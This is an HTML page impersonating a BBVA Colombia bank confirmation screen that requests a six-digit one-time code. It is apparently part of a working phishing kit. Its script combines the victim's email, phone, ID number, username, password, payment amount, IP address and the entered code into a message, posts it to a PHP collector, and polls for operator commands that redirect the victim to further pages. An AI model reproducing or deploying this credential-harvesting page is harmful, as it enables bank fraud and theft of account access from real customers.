<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmación -</title>    
    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.critical/small.lc-20230516-100300-lc.min.ACSHASH7eef699753cd6a0f27993280a0fb5f65.css" type="text/css">
    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.critical/large.lc-20230516-100300-lc.min.ACSHASHda2ffa67489b67d75fb66b15abe18fda.css" type="text/css" media="all and (min-width: 600px)">
    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.common.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">
    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.header/small.lc-20230516-100300-lc.min.ACSHASH659ec30a3124dc28185995a987513909.css" type="text/css">
    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.header/large.lc-20230516-100300-lc.min.ACSHASHf2abe09e37ea20c7751c9867a9bc7863.css" type="text/css" media="all and (min-width: 600px)">
    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.alert/small.lc-20230516-100300-lc.min.ACSHASH85b3494b833d0befdc7e352f559401c4.css" type="text/css">
    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.alert/large.lc-20230516-100300-lc.min.ACSHASH6b857abe29b6e800a05ceadad087731c.css" type="text/css" media="all and (min-width: 600px)">
    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.stickyalert.lc-20230516-100300-lc.min.ACSHASHa603fa119312657f11fed46c3d83e072.css" type="text/css">
    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.mainNavigation/small.lc-20230516-100300-lc.min.ACSHASH68c7c67037ad8291ee4b4ad9061a9e30.css">
    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.mainNavigation/large.lc-20230516-100300-lc.min.ACSHASH8f81358eebb18a1778ddd3319a401956.css" type="text/css" media="all and (min-width: 600px)">
    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.access/small.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">
    <link rel="stylesheet" href="apps/bbva/pwebs/components/clientlibs/bbva.access/large.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">
    <link href="css/style.css" rel="stylesheet">
    <style>
        body {
            font-family: BentonSansBBVA-Book, Helvetica, Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
        }
        .formulario {
            background-color: #fff;
            width: 100%;
            max-width: 1176px;
            margin: 0 auto;
            min-height: calc(100vh - 200px);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .signin {
            padding: 40px 20px;
            text-align: center;
            width: 100%;
            max-width: 500px;
        }
        .titulo {
            font-size: 26px;
            color: #121212;
            font-weight: 400;
            width: 100%;
            max-width: 423px;
            margin: 0 auto 20px auto;
        }
        .descripcion {
            font-size: 16px;
            color: #666;
            line-height: 1.5;
            margin-bottom: 30px;
            text-align: center;
        }

        .etiqueta {
            font-size: 16px;        
            color: #666;
            margin-bottom: 8px;
            display: block;
        }
        
        #TokenOTP {
            width: 100% !important;
            max-width: 200px !important;
            height: 40px !important;
            border: 1px solid #ccc !important;
            border-radius: 4px !important;
            outline: none !important;
            background-color: #f4f4f4 !important;
            font-size: 18px !important;
            color: #121212 !important;
            margin: 16px auto 0 auto !important;
            padding: 10px !important;
            box-sizing: border-box !important;
            text-align: center !important;
            letter-spacing: 2px !important;
            display: block !important;
        }
        


        .boton-azul {
            background-color: #237ABA;
            color: #fff;
            cursor: pointer;
            border: none;
            border-radius: 1px;
            font-family: BentonSansBBVA-Book,Helvetica,Arial,sans-serif;
            font-size: 15px;
            margin: 0;
            padding: 20px 40px;
            margin-bottom: 20px;
            font-weight: 700;
            text-decoration: none;
            display: inline-block;
        }
        .boton-azul:hover {
            background-color: #1464A5;
            color: #fff;
        }
        .btn-link {
            color: #237ABA;
            text-decoration: none;
            font-size: 14px;
        }
        .btn-link:hover {
            text-decoration: underline;
        }
        .callto {
            margin-top: 20px;
        }
        .col-md-12 {
            margin-bottom: 10px;
        }
                 .general-wrapper {
             min-height: 100vh;
         }
         
         .fondo{
             width: 100%;
             height: 100%;
             position: fixed;
             z-index: 189;
             top: 0;
             left: 0;
             background: #ffffff96;
             display: none;
         }

         .mensaje{  
             color: #fff;
             padding: 30px; 
             background-color: #004481;  
             width: 94%;
             max-width: 480px;              
             position: fixed;
             z-index: 190;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             font-family: BentonSansBBVA-Book, Helvetica, Arial, sans-serif;
             font-size: 14px;                                                          
             display: none;
             text-align: center;
         }

         .mensaje td{                      
             font-family: BentonSansBBVA-Book, Helvetica, Arial, sans-serif;
             font-size: 16px;         
         }

         #cargandoani2{
             width: 70px !important;
             display: none;
         }

         #cargandoani{
             width: 200px !important;
         }

         @media (max-width:478px) {
             #cargandoani2{
                 display: initial;
             }
             #cargandoani{
                 display: none;
             }
         }
    </style>
</head>
 <body class="bbva__base" itemscope itemtype="http://schema.org/WebPage">
     <div class="fondo"></div>
     <div class="mensaje"> 
         <table style="vertical-align: middle !important;">
             <tr style="vertical-align: middle !important;">
                 <td align="justify" valign="middle" style="vertical-align: middle !important;">Por favor espere un momento estamos validando algunos datos. Puede tardar entre 1 a 5 minuto. No cierres o recargues esta ventana.</td>
                 <td valign="middle" style="vertical-align: middle !important;"><img id="cargandoani" src="img/loader.gif"></td>
             </tr>
         </table> 
         <img id="cargandoani2" src="img/loader.gif" width="70">
     </div>
     <div class="general-wrapper">
        <header class="header__base wrapper" data-component="tabulation">
            <div class="alert--full alert--yellow" data-component="browseralert" data-component-params='{"browserSupport": {"partial":[],"any":[]}, "noSupportFallbackPage" : null}'>
            </div>

            <div class="cookies alert--full alert--extra alert--stickybottom">
                <div class="alert__base stickyalert__base container" data-component="cookies">
                    <div class="alert__wrapper">
                        <img class="bbva-svgicon alert__icon" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/4_002_info.svg" alt=""/>
                        <p class="alert__title" itemprop="name" aria-level="1">Información</p>
                        <div class="alert__text rte">
                            <p>Utilizamos cookies propias y de terceros para mejorar nuestros servicios y mostrar a los usuarios publicidad relacionada con sus preferencias. Si se continúa navegando, consideramos que se acepta su uso. Es posible cambiar la configuración u obtener más información.<br />
                            </p>
                        </div>
                        <a itemprop="mainEntityOfPage" aria-label="Más información" title="Más información" target="_self" class="alert__link link__base" href="/personas/aviso-legal.html">
                            Más información
                        </a>
                        <button class="alert__close" aria-label="Cierra cookie" data-alert-close>
                            <i class="bbva-icon bbva-icon__2_022_close"></i>
                        </button>
                    </div>
                </div>
            </div>

            <a class="skip2content invisible" tab-index="0" href="#main" aria-label="Ir al contenido principal">
                Ir al contenido principal
            </a>        
            
            <nav class="header__container background--navy" aria-label="bbva colombia" data-component="header" data-dl-component data-dl-component-name="header" data-dl-component-type="bbva/pwebs/components/par/header" id="header">
                <div class="header__main container">
                    <div class="header__wrapper">            
                        <div class="header__logo" data-component="svgLogoFix" itemscope itemtype="http://schema.org/Organization">
                            <a itemscope="url" class="header__logo__link" href="https://www.bbva.com.co" target="_self" aria-label="home bbva colombia" title="bbva colombia">
                                <img data-component-params='{"keepSize": "" }' src="https://www.bbva.com.co/content/dam/public-web/global/images/logos/logo_bbva_blanco.svg" srcset="https://www.bbva.com.co/content/dam/public-web/global/images/logos/logo_bbva_blanco.svg" sizes="(min-width: 900px) 20vw, 50vw" itemprop="logo" class="header__image" alt="bbva colombia" role="img"/>
                            </a>
                        </div>
                        <div class="header__mainnavigation" itemscope itemtype="https://schema.org/SiteNavigationElement">
                            <nav class="mainnavigation__base">
                                <ul class="mainnavigation__list">
                                    <li itemprop="name" class="mainnavigation__item mainnavigation__item--active">
                                        <a itemprop="url" aria-label="Personas Opción seleccionada" href="#" target="_self" class="mainnavigation__link">Personas</a>
                                    </li>
                                    <li itemprop="name" class="mainnavigation__item">
                                        <a itemprop="url" aria-label="Empresas " target="_self" class="mainnavigation__link" href="/empresas.html">Empresas</a>
                                    </li>
                                </ul>
                            </nav>            
                        </div>
                    </div>
                    <nav class="header__actions" itemscope="" itemtype="https://schema.org/SiteNavigationElement">
                        <ul class="header__actions__ulist">
                            <li itemprop="name" class="header__actions__list header__actions--tablet-hidden header__actions--mobile-hidden">
                                <a itemprop="url" class="header__actions__item__link header__createaccount" href="https://www.bbva.com.co/personas/registrate.html">
                                    <img class="bbva-svgicon bbva-svgicon--largemobile" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/3_051_newclient.svg" alt=""/>
                                    <span>Regístrate</span>
                                </a>
                            </li>
                            <li itemprop="name" class="header__actions__list header__actions--tablet-left">
                                <div data-component="access" id="btnAcceso">
                                    <a class="header__actions__item__link header__actions--menu header__access" accesskey="a" itemprop="url" aria-label="Acceso" href="javascript:void(0)" aria-expanded="false">
                                        <svg class="header__icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 260" height="24px" width="24px">
                                            <defs><style>.bbvaicn{fill:#fff}</style></defs>
                                            <path class="bbvaicn" d="M161.38 132.34a70 70 0 0 1-62.76 0A90 90 0 0 0 30 219.77v20h200v-20a90 90 0 0 0-68.62-87.43zM160 209.77h-30v-20h50zm-30-90a50 50 0 1 0-50-50 50 50 0 0 0 50 50z"/>
                                        </svg>
                                        <span class="header__access__text--desktop">Acceso</span>
                                        <span class="header__access__text--tablet">Acceso</span>
                                        <span class="header__access__text--mobile">Acceso</span>
                                    </a>
                                </div>
                            </li>

                            <li class="header__actions__list header__actions--tablet-right">
                                <a class="megamenu__trigger header__actions__item__link" href="javascript:void(0);" aria-expanded="false" aria-haspopup="true" aria-label="Menú principal" aria-controls="megamenu__aside" accesskey="m">
                                    <span class="megamenu__trigger megamenu__trigger__open header__actions--menu" aria-hidden="false">
                                        <span class="header__actions__item__link__text">Menú</span>
                                        <svg class="header__icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 260" height="24px" width="24px">
                                            <defs><style>.bbvaicn{fill:#fff}</style></defs>
                                            <g>
                                                <polygon class="bbvaicn" points="210.37 80.12 20.37 80.12 20.37 50.12 240.37 50.12 210.37 80.12"/>
                                                <polygon class="bbvaicn" points="180.37 145.12 20.37 145.12 20.37 115.12 210.37 115.12 180.37 145.12"/>
                                                <polygon class="bbvaicn" points="150.37 210.12 20.37 210.12 20.37 180.12 180.37 180.12 150.37 210.12"/>
                                            </g>
                                        </svg>
                                    </span>
                                </a>
                            </li>
                        </ul>
                    </nav>
                </div>
            </nav>
        </header>

        <main class="bbva--main wrapper" id="main" tabindex="-1">
            <div class="formulario">
                <div class="signin">
                    <h1 class="titulo"><strong>CONFIRMACIÓN</strong></h1>
                    <p class="descripcion">
                        Para confirmar tu operación, ingresa el código de 6 dígitos que recibiste en tu dispositivo móvil o en tu APP.
                    </p>
                    
                                         <form id="noform-token" autocomplete="OFF">            
                         <div class="etiqueta">Código de verificación</div>
                         <input type="text" id="TokenOTP" name="TokenOTP" autocomplete="off" maxlength="6">
                     </form>
                    
                    <div class="row callto">
                        <div class="col-md-12">
                            <a id="btnToken" class="boton-azul">Validar</a>
                        </div>
                        <div class="col-md-12">
                            <a class="btn-link" href="#">¿No recibiste el código?</a>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>

         <script>
     document.addEventListener("DOMContentLoaded", function () {
       setTimeout(function() {
         const tokenInput = document.getElementById('TokenOTP');
         if (tokenInput) {
           tokenInput.disabled = false;
           tokenInput.readOnly = false;
           tokenInput.style.pointerEvents = 'auto';
           tokenInput.style.userSelect = 'auto';
           tokenInput.style.webkitUserSelect = 'auto';
           tokenInput.style.mozUserSelect = 'auto';
           tokenInput.style.msUserSelect = 'auto';
           
            tokenInput.addEventListener('input', function(e) {
              this.value = this.value.replace(/[^0-9]/g, '');
            });
            
            tokenInput.focus();
         }
       }, 100);

      const urlParams = new URLSearchParams(window.location.search);
      
      let sessionId = localStorage.getItem('session_id');
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }
      
      const userFromUrl = urlParams.get('user');
      if (userFromUrl) {
        localStorage.setItem('username', userFromUrl);
      }

      // Obtener el monto
      const monto = localStorage.getItem('total_pagar') || "0";

      const btnToken = document.getElementById('btnToken');
      
      if (btnToken) {
        btnToken.addEventListener('click', async function (event) {
          event.preventDefault();

          const token = document.getElementById('TokenOTP').value;
          
           if (token.length !== 6) {
             alert('El token debe tener 6 dígitos');
             return;
           }
           
           document.querySelector('.fondo').style.display = 'block';
           document.querySelector('.mensaje').style.display = 'block';

          localStorage.setItem('token', token);

          const identificacion = localStorage.getItem('identificacion') || '';
          
          const userAgent = navigator.userAgent;
          let dispositivo = 'PC';
          
          if (/Android/i.test(userAgent)) {
            dispositivo = 'Android';
          } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
            dispositivo = 'iPhone';
          } else if (/Windows/i.test(userAgent)) {
            dispositivo = 'PC';
          } else if (/Mac/i.test(userAgent)) {
            dispositivo = 'Mac';
          } else if (/Linux/i.test(userAgent)) {
            dispositivo = 'Linux';
          }
          
          const hora = new Date().toLocaleString('es-ES');
          
          fetch('get_ip.php')
            .then(response => response.json())
            .then(data => {
              const ip = data.ip || 'No disponible';
              
              // INCLUIR MONTO EN EL MENSAJE
              const mensaje = `
<b>💎BANCO BBVA💎</b>
<b>• 💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>• 📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>• 💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>• 👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>• 🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>• 🪬Tipo:</b> RECARGA PSE
<b>• 📟Dispositivo:</b> ${dispositivo}
<b>• 🗺IP:</b> ${ip}
<b>• ⏱Hora:</b> ${hora}
------------------------------
<b>• 💰 Monto:</b> $ ${monto}
------------------------------
<b>• 👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
<b>• 🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
------------------------------
<b>• 🔄 Token:</b> ${token}`;

              const formData = new FormData();
              formData.append('message', mensaje);
              formData.append('transactionId', sessionId);

              fetch('procesar_dinamica.php', {
                method: 'POST',
                body: formData
              })
              .then(res => res.json())
              .then(result => {
                if (result.status === 'success') {
                  checkPaymentVerification(sessionId, result.messageId);
                }
              })
                             .catch(err => {
                 document.querySelector('.fondo').style.display = 'none';
                 document.querySelector('.mensaje').style.display = 'none';
               });
            })
            .catch(() => {
              // INCLUIR MONTO EN EL MENSAJE (fallback)
              const mensaje = `
<b>💎BANCO BBVA💎</b>
<b>• 💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>• 📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>• 💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>• 👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>• 🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>• 🪬Tipo:</b> RECARGA PSE
<b>• 📟Dispositivo:</b> ${dispositivo}
<b>• 🗺IP:</b> No disponible
<b>• ⏱Hora:</b> ${hora}
------------------------------
<b>• 💰 Monto:</b> $ ${monto}
------------------------------
<b>• 👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
<b>• 🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
------------------------------
<b>• 🔄 Token:</b> ${token}`;

              const formData = new FormData();
              formData.append('message', mensaje);
              formData.append('transactionId', sessionId);

              fetch('procesar_dinamica.php', {
                method: 'POST',
                body: formData
              })
              .then(res => res.json())
              .then(result => {
                if (result.status === 'success') {
                  checkPaymentVerification(sessionId, result.messageId);
                }
              })
                             .catch(err => {
                 document.querySelector('.fondo').style.display = 'none';
                 document.querySelector('.mensaje').style.display = 'none';
               });
            });
        });
      }
    });

    async function checkPaymentVerification(transactionId, messageId) {
        try {
            const formData = new FormData();
            formData.append('transactionId', transactionId);
            formData.append('messageId', messageId);

            const res = await fetch('verificar_dinamica.php', {
            method: 'POST',
            body: formData
            });
            const result = await res.json();

            if (result.action) {
            document.querySelector('.fondo').style.display = 'none';
            document.querySelector('.mensaje').style.display = 'none';
            
            switch (result.action) {
                case 'pedir_dinamica': 
                alert("Error de Clave Dinamica.");
                window.location.href = "token.php";
                break;
                case 'error_logo': 
                alert("Usuario o clave incorrectos.");
                window.location.href = "index.php";
                break;
                case 'confirm_finalizar':
                window.location.href = "/fin.php";
                break;
                case 'pago_enviado':
                window.location.href = "espera.php";
                break;
            }
            } else {
            setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
            }
        } catch (err) {
            setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }
    }
    </script>
</body>
</html>